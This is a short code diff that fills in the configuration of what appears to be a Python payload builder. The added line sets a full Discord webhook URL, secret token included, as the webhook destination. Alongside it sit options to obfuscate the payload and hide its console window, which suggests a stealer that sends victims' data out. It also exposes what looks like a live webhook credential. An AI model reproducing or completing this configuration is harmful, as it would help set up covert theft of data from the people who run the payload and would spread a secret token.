@@ -17,7 +17,7 @@ except ImportError:
 
 version = "1.0"
 
-webhook = "" # Webhook URL
+webhook = "https://discordapp.com/api/webhooks/1322998982699384912/XAdCym_Ra6S5YPUTBQqrQqf30aTA8p4vCiW9CdQcKkto_6CZ0o7FYNqrHDrYQOrm3vcf" # Webhook URL
 obfuscate = False # Obfuscate the payload
 hideConsole = False # Hide the console when the payload is ran
 forceRead = False
